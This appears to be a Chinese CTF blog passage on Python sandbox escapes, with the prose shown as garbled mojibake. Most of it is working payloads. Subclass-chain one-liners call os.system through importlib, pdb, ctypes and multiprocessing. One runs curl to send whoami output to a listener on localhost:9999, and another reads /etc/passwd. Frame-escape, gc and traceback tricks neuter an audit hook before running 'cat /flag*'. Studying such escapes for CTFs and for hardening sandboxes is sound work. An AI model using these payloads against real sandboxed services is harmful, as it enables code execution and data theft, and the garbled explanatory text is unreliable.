[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)

#imp
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)

#pdb
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pdb&quot; in x.__init__.__globals__ ][0][&quot;pdb&quot;].os.system(&quot;ls&quot;)

# ctypes
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;ctypes&#x27;).CDLL(None).system(&#x27;ls /&#x27;.encode())

# multiprocessing
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;multiprocessing&#x27;).Process(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;curl localhost:9999/?a=`whoami`&#x27;)).start()</code></pre>

<p><strong>File</strong></p>
<pre><code class="highlight plaintext">[ x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;FileLoader&quot; ][0].get_data(0,&quot;/etc/passwd&quot;)</code></pre>



<h3 id="æ ˆå¸§é€ƒé€¸"><a href="#æ ˆå¸§é€ƒé€¸" class="headerlink" title="æ ˆå¸§é€ƒé€¸"></a>æ ˆå¸§é€ƒé€¸</h3><p>å…ˆäº†è§£ä¸€äº›æ¦‚å¿µå§ã€‚</p>
<p><strong>æ ˆå¸§</strong></p>
<p><strong>ç”Ÿæˆå™¨</strong></p>
<p>ç”Ÿæˆå™¨ï¼ˆGeneratorï¼‰æ˜¯ Python ä¸­ä¸€ç§ç‰¹æ®Šçš„è¿­ä»£å™¨ï¼Œå®ƒå¯ä»¥é€šè¿‡ç®€å•çš„å‡½æ•°å’Œè¡¨è¾¾å¼æ¥åˆ›å»ºã€‚ç”Ÿæˆå™¨çš„ä¸»è¦ç‰¹ç‚¹æ˜¯èƒ½å¤Ÿé€ä¸ªäº§ç”Ÿå€¼ï¼Œå¹¶ä¸”åœ¨æ¯æ¬¡ç”Ÿæˆå€¼åä¿ç•™å½“å‰çš„çŠ¶æ€ï¼Œä»¥ä¾¿ä¸‹æ¬¡è°ƒç”¨æ—¶å¯ä»¥ç»§ç»­ç”Ÿæˆå€¼ã€‚è¿™ä½¿å¾—ç”Ÿæˆå™¨éå¸¸é€‚åˆå¤„ç†å¤§å‹æ•°æ®é›†æˆ–éœ€è¦å»¶è¿Ÿè®¡ç®—çš„æƒ…å†µã€‚</p>
<p>åœ¨ Python ä¸­ï¼Œç”Ÿæˆå™¨å¯ä»¥ä½¿ç”¨ yield å…³é”®å­—æ¥å®šä¹‰ã€‚yield ç”¨äºäº§ç”Ÿä¸€ä¸ªå€¼ï¼Œå¹¶åœ¨ä¿ç•™å½“å‰çŠ¶æ€çš„åŒæ—¶æš‚åœå‡½æ•°çš„æ‰§è¡Œã€‚å½“ä¸‹ä¸€æ¬¡è°ƒç”¨ç”Ÿæˆå™¨æ—¶ï¼Œå‡½æ•°ä¼šä»ä¸Šæ¬¡æš‚åœçš„ä½ç½®ç»§ç»­æ‰§è¡Œï¼Œç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ª yield è¯­å¥æˆ–è€…å‡½æ•°ç»“æŸã€‚</p>
<pre><code class="highlight python"><span class="keyword">def</span> <span class="title function_">f</span>():
    a=<span class="number">1</span>
    <span class="keyword">while</span> <span class="literal">True</span>:
        <span class="keyword">yield</span> a
        a+=<span class="number">1</span>
f=f()
<span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#1</span>
<span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#2</span>
<span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#3</span>
<span class="built_in">next</span>() å‡½æ•°åœ¨Pythonä¸­ç”¨äºè·å–è¿­ä»£å™¨çš„ä¸‹ä¸€ä¸ªå…ƒç´ 

<span class="comment">#ç”Ÿæˆå™¨è¡¨è¾¾å¼:</span>
 gen_exp = (x * x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>))

 <span class="keyword">for</span> num <span class="keyword">in</span> gen_exp:
     <span class="built_in">print</span>(num)
<span class="comment">#ç±»ä¼¼äºåˆ—è¡¨æ¨å¯¼å¼ï¼Œä½†ä½¿ç”¨å°æ‹¬å· () è€Œä¸æ˜¯æ–¹æ‹¬å· [] æ¥åˆ›å»ºç”Ÿæˆå™¨è¡¨è¾¾å¼</span></code></pre>

<p><strong>ç”Ÿæˆå™¨å±æ€§</strong></p>
<p><code>gi_code</code>: ç”Ÿæˆå™¨å¯¹åº”çš„codeå¯¹è±¡ã€‚<br><code>gi_frame</code>: ç”Ÿæˆå™¨å¯¹åº”çš„frameï¼ˆæ ˆå¸§ï¼‰å¯¹è±¡ã€‚<br><code>gi_running</code>: ç”Ÿæˆå™¨å‡½æ•°æ˜¯å¦åœ¨æ‰§è¡Œã€‚ç”Ÿæˆå™¨å‡½æ•°åœ¨yieldä»¥åã€æ‰§è¡Œyieldçš„ä¸‹ä¸€è¡Œä»£ç å‰å¤„äºfrozençŠ¶æ€ï¼Œæ­¤æ—¶è¿™ä¸ªå±æ€§çš„å€¼ä¸º0ã€‚<br><code>gi_yieldfrom</code>ï¼šå¦‚æœç”Ÿæˆå™¨æ­£åœ¨ä»å¦ä¸€ä¸ªç”Ÿæˆå™¨ä¸­ yield å€¼ï¼Œåˆ™ä¸ºè¯¥ç”Ÿæˆå™¨å¯¹è±¡çš„å¼•ç”¨ï¼›å¦åˆ™ä¸º Noneã€‚<br><code>gi_frame.f_locals</code>ï¼šä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«ç”Ÿæˆå™¨å½“å‰å¸§çš„æœ¬åœ°å˜é‡ã€‚</p>
<p><strong>ç€é‡ä»‹ç»ä¸€ä¸‹ gi_frame å±æ€§</strong><br><code>gi_frame</code> æ˜¯ä¸€ä¸ªä¸ç”Ÿæˆå™¨ï¼ˆgeneratorï¼‰å’Œåç¨‹ï¼ˆcoroutineï¼‰ç›¸å…³çš„å±æ€§ã€‚å®ƒæŒ‡å‘ç”Ÿæˆå™¨æˆ–åç¨‹å½“å‰æ‰§è¡Œçš„å¸§å¯¹è±¡ï¼ˆframe objectï¼‰ï¼Œå¦‚æœè¿™ä¸ªç”Ÿæˆå™¨æˆ–åç¨‹æ­£åœ¨æ‰§è¡Œçš„è¯ã€‚å¸§å¯¹è±¡è¡¨ç¤ºä»£ç æ‰§è¡Œçš„å½“å‰ä¸Šä¸‹æ–‡ï¼ŒåŒ…å«äº†å±€éƒ¨å˜é‡ã€æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤ç­‰ä¿¡æ¯ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼Œæ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨ç”Ÿæˆå™¨çš„ gi_frame å±æ€§æ¥è·å–ç”Ÿæˆå™¨çš„å½“å‰å¸§ä¿¡æ¯:</p>
<pre><code class="highlight python"><span class="keyword">def</span> <span class="title function_">my_generator</span>():
    <span class="keyword">yield</span> <span class="number">1</span>
    <span class="keyword">yield</span> <span class="number">2</span>
    <span class="keyword">yield</span> <span class="number">3</span>

gen = my_generator()

<span class="comment"># è·å–ç”Ÿæˆå™¨çš„å½“å‰å¸§ä¿¡æ¯</span>
frame = gen.gi_frame

<span class="comment"># è¾“å‡ºç”Ÿæˆå™¨çš„å½“å‰å¸§ä¿¡æ¯</span>
<span class="built_in">print</span>(<span class="string">&quot;Local Variables:&quot;</span>, frame.f_locals)
<span class="built_in">print</span>(<span class="string">&quot;Global Variables:&quot;</span>, frame.f_globals)
<span class="built_in">print</span>(<span class="string">&quot;Code Object:&quot;</span>, frame.f_code)
<span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer:&quot;</span>, frame.f_lasti)</code></pre>

<p><strong>æ ˆå¸§(frame)</strong></p>
<p>åœ¨ Python ä¸­ï¼Œæ ˆå¸§ï¼ˆstack frameï¼‰ï¼Œä¹Ÿç§°ä¸ºå¸§ï¼ˆframeï¼‰ï¼Œæ˜¯ç”¨äºæ‰§è¡Œä»£ç çš„æ•°æ®ç»“æ„ã€‚æ¯å½“ Python è§£é‡Šå™¨æ‰§è¡Œä¸€ä¸ªå‡½æ•°æˆ–æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ ˆå¸§ï¼Œç”¨äºå­˜å‚¨è¯¥å‡½æ•°æˆ–æ–¹æ³•çš„å±€éƒ¨å˜é‡ã€å‚æ•°ã€è¿”å›åœ°å€ä»¥åŠå…¶ä»–æ‰§è¡Œç›¸å…³çš„ä¿¡æ¯ã€‚è¿™äº›æ ˆå¸§ä¼šæŒ‰ç…§è°ƒç”¨é¡ºåºè¢«ç»„ç»‡æˆä¸€ä¸ªæ ˆï¼Œç§°ä¸ºè°ƒç”¨æ ˆã€‚</p>
<p>æ ˆå¸§åŒ…å«äº†ä»¥ä¸‹å‡ ä¸ªé‡è¦çš„å±æ€§ï¼š<br><code>f_locals</code>: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å±€éƒ¨å˜é‡ã€‚é”®æ˜¯å˜é‡åï¼Œå€¼æ˜¯å˜é‡çš„å€¼ã€‚<br><code>f_globals</code>: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•æ‰€åœ¨æ¨¡å—çš„å…¨å±€å˜é‡ã€‚é”®æ˜¯å…¨å±€å˜é‡åï¼Œå€¼æ˜¯å˜é‡çš„å€¼ã€‚<br><code>f_code</code>: ä¸€ä¸ªä»£ç å¯¹è±¡ï¼ˆcode objectï¼‰ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å­—èŠ‚ç æŒ‡ä»¤ã€å¸¸é‡ã€å˜é‡åç­‰ä¿¡æ¯ã€‚<br><code>f_lasti</code>: æ•´æ•°ï¼Œè¡¨ç¤ºæœ€åæ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤çš„ç´¢å¼•ã€‚<br><code>f_back</code>: æŒ‡å‘ä¸Šä¸€çº§è°ƒç”¨æ ˆå¸§çš„å¼•ç”¨ï¼Œç”¨äºæ„å»ºè°ƒç”¨æ ˆ</p>
<h4 id="ç”Ÿæˆå™¨æ ˆå¸§é€ƒé€¸"><a href="#ç”Ÿæˆå™¨æ ˆå¸§é€ƒé€¸" class="headerlink" title="ç”Ÿæˆå™¨æ ˆå¸§é€ƒé€¸"></a><strong>ç”Ÿæˆå™¨æ ˆå¸§é€ƒé€¸</strong></h4><p>åŸç†å…¶å®å°±æ˜¯ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡é€šè¿‡<code>f_back</code>ä¸æ–­è¿”å›å‰ä¸€å¸§ä»è€Œå»è·å–<code>globals</code>å…¨å±€ç¬¦å·è¡¨</p>
<pre><code class="highlight python">s3cret=<span class="string">&quot;this is flag&quot;</span>
<span class="keyword">def</span> <span class="title function_">f</span>():
        <span class="keyword">yield</span> g.gi_frame.f_back.f_back.f_back

g = f().gi_frame  <span class="comment">#ç”Ÿæˆå™¨</span>
<span class="built_in">print</span>(<span class="string">&quot;Local Variables:&quot;</span>, g.f_globals)</code></pre>

<p>åœ¨è¿™é‡Œå…¶å®å°±å¯ä»¥çœ‹åˆ°æˆåŠŸé€ƒå‡º</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250506102803052.png" alt="image-20250506102803052"></p>
<p>è€ŒæŸ¥çœ‹localsæ—¶å°±ä¼šå‘ç°æ˜¯ç©ºåˆ—è¡¨</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250506102848722.png" alt="image-20250506102848722"></p>
<p>æ¨¡æ‹Ÿä¸€ä¸‹æ²™ç®±çš„æ“ä½œ</p>
<pre><code class="highlight python">codes=<span class="string">&#x27;&#x27;&#x27;</span>
<span class="string">def waff():</span>
<span class="string">    def f():</span>
<span class="string">        yield g.gi_frame.f_back</span>
<span class="string"></span>
<span class="string">    g = f()  #ç”Ÿæˆå™¨</span>
<span class="string">    frame = next(g) #è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡</span>
<span class="string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals</span>
<span class="string">    return b</span>
<span class="string">b=waff()</span>
<span class="string">&#x27;&#x27;&#x27;</span>
<span class="built_in">locals</span>=&#123;&#125;
code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)
<span class="built_in">exec</span>(code,<span class="built_in">locals</span>)
<span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])
<span class="comment">#ä½¿ç”¨nextè·å–åˆ°çš„å°±æ˜¯yieldå®šä¹‰çš„å€¼ï¼Œè¿™é‡Œè·å–åˆ°çš„å°±æ˜¯g.gi_frame.f_back</span>
<span class="comment">#ä½¿ç”¨g.gi_frame.f_backçš„è¯ï¼Œé‚£ä¹ˆg = f()å°±å¿…é¡»ä¸ºgï¼Œç”¨çš„å°±æ˜¯è¿™ä¸ªç”Ÿæˆå™¨å¯¹è±¡çš„æ ˆå¸§</span>
<span class="comment">#compile(codes, &quot;test&quot;, &quot;exec&quot;)å°±æ˜¯è®¾ç½®äº†åç§°ä¸ºtestçš„pythonæ²™ç®±ç¯å¢ƒ</span></code></pre>

<p>è¿è¡Œå¾—åˆ° <code>this is flag</code> ,æˆåŠŸé€ƒé€¸å‡ºæ²™ç®±è·å–åˆ°<code>s3cret</code>å˜é‡å€¼</p>
<p>è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>f_locals</code>å»ä»£æ›¿<code>f_globals</code>æ•ˆæœæ˜¯ç›¸åŒçš„ï¼Œä½†æ˜¯è¦æ³¨æ„ï¼Œ<code>locals</code>è¿”å›çš„æ˜¯å±€éƒ¨ç¬¦å·è¡¨ï¼Œå®ƒåŒ…å«äº†åœ¨å½“å‰å‡½æ•°æˆ–æ–¹æ³•å†…éƒ¨å®šä¹‰çš„å˜é‡ã€‚è¿™äº›å±€éƒ¨å˜é‡åªåœ¨å½“å‰å‡½æ•°æˆ–æ–¹æ³•çš„æ‰§è¡Œè¿‡ç¨‹ä¸­å­˜åœ¨ï¼Œå¹¶ä¸”åªèƒ½åœ¨è¯¥å‡½æ•°æˆ–æ–¹æ³•å†…éƒ¨è®¿é—®ã€‚å½“å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œè¿™äº›å±€éƒ¨å˜é‡å°±ä¼šè¢«é”€æ¯ã€‚</p>
<p>æ€ä¹ˆç”¨å‘¢ï¼Œå¯ä»¥ç”¨æ¥é…åˆä¿®æ”¹å‡½æ•°ï¼›ä¹Ÿå¯ä»¥æ‹¿<code>_globals</code>åæ‰“rce</p>
<pre><code class="highlight plaintext">2024L3HCTF æ‰“intå‡½æ•°è¿”å›å€¼ å‚è€ƒé“¾æ¥:https://xz.aliyun.com/news/13075</code></pre>

<h4 id="å¼‚å¸¸æ ˆå¸§é€ƒé€¸"><a href="#å¼‚å¸¸æ ˆå¸§é€ƒé€¸" class="headerlink" title="å¼‚å¸¸æ ˆå¸§é€ƒé€¸"></a><strong>å¼‚å¸¸æ ˆå¸§é€ƒé€¸</strong></h4><p>é€šè¿‡ä¸»åŠ¨æŠ›å‡ºå¼‚å¸¸+æŠ“æŠ›å‡ºé”™è¯¯çš„æ ˆå¸§æ¥é€ƒé€¸æ²™ç®±</p>
<p>ç»™ä¸€ä¸²ç®€å•çš„å®ä¾‹:</p>
<pre><code class="highlight python"><span class="keyword">try</span>:
    <span class="number">1</span>/<span class="number">0</span>
<span class="keyword">except</span> Exception <span class="keyword">as</span> e:
    frame=e.__traceback__.tb_frame
    builtins=frame.f_globals[<span class="string">&#x27;__builtins__&#x27;</span>]
    builtins.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250603194452776.png" alt="image-20250603194452776"></p>
<p>å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œäº†ã€‚</p>
<h4 id="å¼‚æ­¥æ ˆå¸§é€ƒé€¸"><a href="#å¼‚æ­¥æ ˆå¸§é€ƒé€¸" class="headerlink" title="å¼‚æ­¥æ ˆå¸§é€ƒé€¸"></a>å¼‚æ­¥æ ˆå¸§é€ƒé€¸</h4><pre><code class="highlight python"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">a</span>():
    <span class="keyword">pass</span>
a().cr_frame.f_globals</code></pre>

<h3 id="å˜é‡è¦†ç›–ä¸å‡½æ•°ç¯¡æ”¹"><a href="#å˜é‡è¦†ç›–ä¸å‡½æ•°ç¯¡æ”¹" class="headerlink" title="å˜é‡è¦†ç›–ä¸å‡½æ•°ç¯¡æ”¹"></a>å˜é‡è¦†ç›–ä¸å‡½æ•°ç¯¡æ”¹</h3><p>ä¼˜é›…å•Šï¼Œå¾ˆä¼˜é›…å•Šã€‚ã€‚</p>
<p>è¿™é‡Œç®€å•ä¸€äº›çš„å°±æ˜¯ç»™å‡ºblacklistä½†æ˜¯æ˜¯å¯æ§çš„ï¼Œå¯ä»¥ç›´æ¥æ”¹å˜é‡ç„¶åç›´æ¥æ‰§è¡Œå‘½ä»¤å°±å¯ä»¥äº†</p>
<p>åœ¨ Python ä¸­ï¼Œsys æ¨¡å—æä¾›äº†è®¸å¤šä¸ Python è§£é‡Šå™¨å’Œå…¶ç¯å¢ƒäº¤äº’çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬å¯¹å…¨å±€å˜é‡å’Œå‡½æ•°çš„æ“ä½œã€‚åœ¨æ²™ç®±ä¸­è·å– sys æ¨¡å—å°±å¯ä»¥è¾¾åˆ°å˜é‡è¦†ç›–ä¸å‡½æ•°æ“¦ç¯¡æ”¹çš„ç›®çš„.</p>
<p>sys.modules å­˜æ”¾äº†ç°æœ‰æ¨¡å—çš„å¼•ç”¨, é€šè¿‡è®¿é—® <code>sys.modules[&#39;__main__&#39;]</code> å°±å¯ä»¥è®¿é—®å½“å½“å‰æ¨¡å—å®šä¹‰çš„æ‰€æœ‰å‡½æ•°ä»¥åŠå…¨å±€å˜é‡</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; aaa = &#x27;bbb&#x27;
&gt;&gt;&gt; def my_input():
...     dict_global = dict()
...     while True:
...       try:
...           input_data = input(&quot;&gt; &quot;)
...       except EOFError:
...           print()
...           break
...       except KeyboardInterrupt:
...           print(&#x27;bye~~&#x27;)
...           continue
...       if input_data == &#x27;&#x27;:
...           continue
...       try:
...           complie_code = compile(input_data, &#x27;&lt;string&gt;&#x27;, &#x27;single&#x27;)
...       except SyntaxError as err:
...           print(err)
...           continue
...       try:
...           exec(complie_code, dict_global)
...       except Exception as err:
...           print(err)
... 
&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.modules[&#x27;__main__&#x27;]
&lt;module &#x27;__main__&#x27; (built-in)&gt;
&gt;&gt;&gt; dir(sys.modules[&#x27;__main__&#x27;])
[&#x27;__annotations__&#x27;, &#x27;__builtins__&#x27;, &#x27;__doc__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;aaa&#x27;, &#x27;my_input&#x27;, &#x27;sys&#x27;]
&gt;&gt;&gt; sys.modules[&#x27;__main__&#x27;].aaa
&#x27;bbb&#x27;</code></pre>

<p>é™¤äº†é€šè¿‡ sys æ¨¡å—æ¥è·å–å½“å‰æ¨¡å—çš„å˜é‡ä»¥åŠå‡½æ•°å¤–,è¿˜å¯ä»¥é€šè¿‡ <code>__builtins__</code>ç¯¡æ”¹å†…ç½®å‡½æ•°ç­‰,è¿™åªæ˜¯ä¸€ä¸ªæ€è·¯.</p>
<p>æ€»ä½“æ¥è¯´,åªè¦è·å–äº†æŸä¸ªå‡½æ•°æˆ–è€…å˜é‡å°±å¯ä»¥ç¯¡æ”¹, éš¾ç‚¹å°±åœ¨äºè·å–.</p>
<h4 id="åˆ©ç”¨-gc-è·å–å·²åˆ é™¤æ¨¡å—"><a href="#åˆ©ç”¨-gc-è·å–å·²åˆ é™¤æ¨¡å—" class="headerlink" title="åˆ©ç”¨ gc è·å–å·²åˆ é™¤æ¨¡å—"></a>åˆ©ç”¨ gc è·å–å·²åˆ é™¤æ¨¡å—</h4><p>è¿™ä¸ªæ€è·¯æ¥æºäº <a href="https://github.com/fab1ano/hxp-ctf-20/tree/master/audited">writeup by fab1ano â€“ github</a></p>
<p>è¿™é“é¢˜çš„ç›®æ ‡æ˜¯è¦†ç›– <code>__main__</code> ä¸­çš„ <code>__exit</code> å‡½æ•°,ä½†æ˜¯é¢˜ç›®å°† <code>sys.modules[&#39;__main__&#39;]</code> åˆ é™¤äº†,æ— æ³•ç›´æ¥è·å–.</p>
<pre><code class="highlight plaintext">for module in set(sys.modules.keys()):
    if module in sys.modules:
        del sys.modules[module]</code></pre>

<p><code>gc</code> æ˜¯Pythonçš„å†…ç½®æ¨¡å—ï¼Œå…¨åä¸ºâ€garbage collectorâ€ï¼Œä¸­æ–‡è¯‘ä¸ºâ€åƒåœ¾å›æ”¶â€ã€‚<code>gc</code> æ¨¡å—ä¸»è¦çš„åŠŸèƒ½æ˜¯æä¾›ä¸€ä¸ªæ¥å£ä¾›å¼€å‘è€…ç›´æ¥ä¸ Python çš„åƒåœ¾å›æ”¶æœºåˆ¶è¿›è¡Œäº¤äº’ã€‚</p>
<p>Python ä½¿ç”¨äº†å¼•ç”¨è®¡æ•°ä½œä¸ºå…¶ä¸»è¦çš„å†…å­˜ç®¡ç†æœºåˆ¶ï¼ŒåŒæ—¶ä¹Ÿå¼•å…¥äº†å¾ªç¯åƒåœ¾å›æ”¶å™¨æ¥æ£€æµ‹å¹¶æ”¶é›†å¾ªç¯å¼•ç”¨çš„å¯¹è±¡ã€‚<code>gc</code> æ¨¡å—æä¾›äº†ä¸€äº›å‡½æ•°ï¼Œè®©ä½ å¯ä»¥ç›´æ¥æ§åˆ¶è¿™ä¸ªå¾ªç¯åƒåœ¾å›æ”¶å™¨ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€äº› <code>gc</code> æ¨¡å—ä¸­çš„ä¸»è¦å‡½æ•°ï¼š</p>
<ol>
<li><code>gc.collect(generation=2)</code>ï¼šè¿™ä¸ªå‡½æ•°ä¼šç«‹å³è§¦å‘ä¸€æ¬¡åƒåœ¾å›æ”¶ã€‚ä½ å¯ä»¥é€šè¿‡ <code>generation</code> å‚æ•°æŒ‡å®šè¦æ”¶é›†çš„ä»£æ•°ã€‚Python çš„åƒåœ¾å›æ”¶å™¨æ˜¯åˆ†ä»£çš„ï¼Œæ–°åˆ›å»ºçš„å¯¹è±¡åœ¨ç¬¬ä¸€ä»£ï¼Œç»å†è¿‡ä¸€æ¬¡åƒåœ¾å›æ”¶åä»ç„¶å­˜æ´»çš„å¯¹è±¡ä¼šè¢«ç§»åˆ°ä¸‹ä¸€ä»£ã€‚</li>
<li><code>gc.get_objects()</code>ï¼šè¿™ä¸ªå‡½æ•°ä¼šè¿”å›å½“å‰è¢«ç®¡ç†çš„æ‰€æœ‰å¯¹è±¡çš„åˆ—è¡¨ã€‚</li>
<li><code>gc.get_referrers(*objs)</code>ï¼šè¿™ä¸ªå‡½æ•°ä¼šè¿”å›æŒ‡å‘ <code>objs</code> ä¸­ä»»ä½•ä¸€ä¸ªå¯¹è±¡çš„å¯¹è±¡åˆ—è¡¨ã€‚</li>
</ol>
<p>exp å¦‚ä¸‹</p>
<pre><code class="highlight plaintext">for obj in gc.get_objects():
    if &#x27;__name__&#x27; in dir(obj):
        if &#x27;__main__&#x27; in obj.__name__:
            print(&#x27;Found module __main__&#x27;)
            mod_main = obj
        if &#x27;os&#x27; == obj.__name__:
            print(&#x27;Found module os&#x27;)
            mod_os = obj
mod_main.__exit = lambda x : print(&quot;[+] bypass&quot;)</code></pre>

<p>åœ¨ 3.11 ç‰ˆæœ¬å’Œ python 3.8.10 ç‰ˆæœ¬ä¸­æµ‹è¯•å‘ç°ä¼šè§¦å‘ gc.get_objects hook å¯¼è‡´æ— æ³•æˆåŠŸ.</p>
<h4 id="åˆ©ç”¨-traceback-è·å–æ¨¡å—"><a href="#åˆ©ç”¨-traceback-è·å–æ¨¡å—" class="headerlink" title="åˆ©ç”¨ traceback è·å–æ¨¡å—"></a>åˆ©ç”¨ traceback è·å–æ¨¡å—</h4><p>è¿™ä¸ªæ€è·¯æ¥æºäº <a href="https://github.com/hstocks/ctf_writeups/blob/master/2020/hxp/audited/README.md">writeup by hstocks â€“ github</a></p>
<p>ä¸»åŠ¨æŠ›å‡ºå¼‚å¸¸, å¹¶è·å–å…¶åè¦æ‰§è¡Œçš„ä»£ç , ç„¶åå°†<code>__exit</code> è¿›è¡Œæ›¿æ¢, æ€è·¯ä¹Ÿæ˜¯ååˆ†å·§å¦™.</p>
<pre><code class="highlight plaintext">try:
    raise Exception()
except Exception as e:
    _, _, tb = sys.exc_info()
    nxt_frame = tb.tb_frame

    # Walk up stack frames until we find one which
    # has a reference to the audit function
    while nxt_frame:
        if &#x27;audit&#x27; in nxt_frame.f_globals:
            break
        nxt_frame = nxt_frame.f_back

    # Neuter the __exit function
    nxt_frame.f_globals[&#x27;__exit&#x27;] = print

    # Now we&#x27;re free to call whatever we want
    os.system(&#x27;cat /flag*&#x27;)</code></pre>

<p>ä½†æ˜¯å®é™…æµ‹è¯•æ—¶ä½¿ç”¨ python 3.11 å‘ç° <code>nxt_frame = tb.tb_frame</code> ä¼šè§¦å‘ <code>object.__getattr__</code> hook. ä¸åŒçš„ç‰ˆæœ¬ä¸­è§¦å‘ hook çš„åœ°æ–¹ä¼šæœ‰å·®å¼‚,è¿™ä¸ª payload å¯èƒ½ä»…åœ¨ python 3.9 (é¢˜ç›®ç‰ˆæœ¬)ä¸­é€‚ç”¨</p>
<h3 id="æ¨¡å—é‡è½½-åŸmoduleè¢«ç¯¡æ”¹"><a href="#æ¨¡å—é‡è½½-åŸmoduleè¢«ç¯¡æ”¹" class="headerlink" title="æ¨¡å—é‡è½½(åŸmoduleè¢«ç¯¡æ”¹)"></a>æ¨¡å—é‡è½½(åŸmoduleè¢«ç¯¡æ”¹)</h3><p>ä¸ºä»€ä¹ˆè¦<strong>é‡è½½</strong>å‘¢ï¼Ÿå› ä¸ºç›®æ ‡æ¨¡å—&#x2F;æ–¹æ³•åœ¨ä¸€å¼€å§‹å°±è¢«<strong>åˆ é™¤&#x2F;è¦†ç›–</strong>äº†ï¼Œä½†æ˜¯é€šè¿‡ä¸€äº›æ‰‹æ®µï¼Œå°±å¯ä»¥é‡æ–°åŠ è½½è¿™äº›æ¨¡å—</p>
<pre><code class="highlight bash">&gt;&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]
&lt;built-in <span class="keyword">function</span> <span class="built_in">eval</span>&gt;
&gt;&gt;&gt; del __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]
&gt;&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]
Traceback (most recent call last):
  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line 1, <span class="keyword">in</span> &lt;module&gt;
KeyError: <span class="string">&#x27;eval&#x27;</span></code></pre>

<h4 id="reload-é‡æ–°åŠ è½½"><a href="#reload-é‡æ–°åŠ è½½" class="headerlink" title="reload é‡æ–°åŠ è½½"></a>reload é‡æ–°åŠ è½½</h4><p>reloadå‡½æ•°åœ¨ä¸åŒç‰ˆæœ¬ä¸­çš„ä½ç½®ä¸åŒ</p>
<pre><code class="highlight plaintext">Python 2.x
&gt;&gt;&gt;reload(module)

Python 2.x-3.3
&gt;&gt;&gt;import imp
&gt;&gt;&gt;impo.reload(module)

Python 3.4-latest
&gt;&gt;&gt;import importlib
&gt;&gt;&gt;importlib.reload(module)</code></pre>

<p>reload å‡½æ•°å¯ä»¥é‡æ–°åŠ è½½æ¨¡å—ï¼Œè¿™æ ·è¢«åˆ é™¤çš„å‡½æ•°èƒ½è¢«é‡æ–°åŠ è½½</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
